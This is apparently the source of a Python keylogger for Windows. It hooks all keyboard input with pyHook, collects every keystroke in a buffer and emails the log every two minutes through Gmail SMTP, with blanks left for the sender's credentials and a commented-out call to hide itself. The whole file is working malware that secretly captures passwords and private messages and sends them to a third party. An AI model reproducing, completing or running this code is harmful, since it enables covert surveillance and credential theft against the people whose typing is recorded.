import pyHook, pythoncom
import smtplib
import sys
import threading
import datetime, time


def sendMail():
    global data
    dateAndTime = datetime.datetime.now()
    username = "" #insert username here
    password = "" #insert password here
    FROM = "" #insert from email address here
    TO = "" #insert to email address here
    SUBJECT = "Jeff Log " + str(dateAndTime)
    TEXT = data
    server = smtplib.SMTP('smtp.gmail.com', 587) #this assumes a gmail login.
    server.starttls()
    server.login(username, password)

    message = """\
From: %s
To: %s
Subject: %s

%s
""" % (FROM, "".join(TO), SUBJECT, TEXT)



    msg = data

    try:
        server.sendmail(FROM, TO, message)
        server.quit()
        data = ""
        timah = threading.Timer(120.0, sendMail) #repeats every 2 minutes
        timah.start() #starts thread
    except:
        sys.exit(0)


def OnKeyBoardEvent(event):
    global data, OemList
    if not event.Ascii == 27 and not event.Ascii == 0:
        logKey = chr(event.Ascii) if len(event.Key) <=1 or event.Key in OemList else event.Key
        data = data + logKey + " "


# create a hook manager
getter = pyHook.HookManager()
# watch for all mouse events
getter.KeyDown = OnKeyBoardEvent
# set the hook
getter.HookKeyboard()

data = ""
OemList = ["Oem_Period","Oem_1","Oem_2", "Oem_3", "Oem_4", "Oem_5", "Oem_6", "Oem_7", "Oem_Comma", "Oem_Minus", "Oem_Plus"]

#if __name__ == "__main__":
#    hide()


timeah = threading.Timer(120.0, sendMail)
timeah.start()

pythoncom.PumpMessages()
